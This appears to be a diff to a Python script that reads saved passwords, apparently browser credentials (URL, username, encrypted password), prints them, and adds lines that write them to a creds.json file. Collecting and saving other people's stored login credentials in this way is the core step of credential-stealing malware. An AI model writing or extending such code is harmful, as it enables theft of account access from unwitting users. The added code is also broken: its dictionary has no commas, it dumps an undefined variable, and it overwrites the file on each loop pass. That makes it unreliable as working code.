@@ -456,6 +456,16 @@ while True:
                     for url, username, encrypted_password in passwords[:5]:
                         print(f"URL: {url}")
                         print(f"Username: {username}")
+                        print(f"Encrypted Pass: {encrypted_password}")
+
+                        web = {
+                            "Site": url
+                            "User": username
+                            "Encrypted password:" encrypted_password
+                        }
+
+                        with open("creds.json", "w") as f: 
+                            json.dump(data, f, indent=4)
                     print(f"Total found: {len(passwords)}")
                 else:
                     print("No passwords found")
